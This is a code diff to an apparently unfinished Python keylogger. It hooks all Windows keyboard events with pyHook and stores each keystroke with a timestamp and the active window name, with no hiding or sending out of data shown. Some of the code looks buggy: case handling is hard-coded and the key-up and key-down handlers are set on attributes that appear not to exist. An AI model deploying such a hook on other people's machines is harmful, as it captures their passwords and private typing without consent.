@@ -5,10 +5,70 @@ import pythoncom, pyHook
 import os, sys
 from EventManager import EventManager, KeyEvent
 from datetime import datetime
-win = win32console.GetConsoleWindow()
+import json
 
-eventManager = EventManager()
+#load the configurations from json file
+def load_cfg(path):
+    jsonres = {}
+    try:
+        with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
+            jsonres = json.load(f)
+    except Exception as e:
+        print("Exception: ", e)
+    return jsonres
+    
+    
+def OnKeyboardEventUp(event):
+    # Check exit condition
+    if chr(event.Ascii) == ']': 
+        sys.exit(1)
+        
+    # Create KeyEvent object
+    now = datetime.now()
+    now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
+    now_epoch = now.timestamp()
+    isCaps = True
+    event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), isCaps, processKey(chr(event.Ascii), isCaps))
+    
+    # Print for debugging
+    # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+    # print ('MessageName:',event.MessageName)
+    # print ('WindowName:',event.WindowName)
+    # print ('Ascii:', event.Ascii, chr(event.Ascii))
+    print(event)
+    print ('---')
+    
+    # Store KeyEvent
+    eventManager.addEvent(event)
+    
+    return True
 
+    
+def OnKeyboardEventDown(event):
+    # Check exit condition
+    if chr(event.Ascii) == ']': 
+        sys.exit(1)
+        
+    # Create KeyEvent object
+    now = datetime.now()
+    now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
+    now_epoch = now.timestamp()
+    isCaps = True
+    event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), isCaps, processKey(chr(event.Ascii), isCaps))
+    
+    # Print for debugging
+    # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+    # print ('MessageName:',event.MessageName)
+    # print ('WindowName:',event.WindowName)
+    # print ('Ascii:', event.Ascii, chr(event.Ascii))
+    print(event)
+    print ('---')
+    
+    # Store KeyEvent
+    eventManager.addEvent(event)
+    
+    return True
+    
 def OnKeyboardEvent(event): 
     print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
     print ('MessageName:',event.MessageName)
@@ -60,25 +120,45 @@ def OnKeyboardEvent(event):
     return True
 
 
+'''
+This function returns the character for a key after processing for capslock
+
+If the key is alphabetical, return the upper/lower version depending on caps state
+Otherwise, return the key itself
+'''
 def processKey(lowerKey, isCaps):
+    # if lowerKey.isAlpha():
     if not isCaps:
         return lowerKey
     return lowerKey.upper()
+    # return lowerKey
 
-try:
-	# create a hook manager object 
-	hm = pyHook.HookManager() 
-	hm.KeyAll = OnKeyboardEvent
-	# set the hook 
-	hm.HookKeyboard() 
-	# wait forever 
-	pythoncom.PumpMessages()
-except KeyboardInterrupt:
-    sys.exit(1)
-except Exception as e:
-	print("Exception: ",e)
-	sys.exit(1)
-	# hm.UnhookKeyboard()
+
+if __name__ == "__main__":
+    main_cfg = load_cfg('./main_cfg.json')    
+    
+    win = win32console.GetConsoleWindow()
+    
+    eventManager = EventManager()
+    
+    try:
+    	# create a hook manager object 
+    	hm = pyHook.HookManager() 
+    	
+    	# Map key events
+    	hm.keyup = OnKeyboardEventUp
+    	hm.keydown = OnKeyboardEventDown
+    	
+    	# set the hook 
+    	hm.HookKeyboard() 
+    	
+    	# wait forever 
+    	pythoncom.PumpMessages()
+    except KeyboardInterrupt:
+        sys.exit(1)
+    except Exception as e:
+    	print("Exception: ",e)
+    	sys.exit(1)
 	
 '''
 On startup, check if capslock and shift are being pressed down - this will determine self.caps = True/False
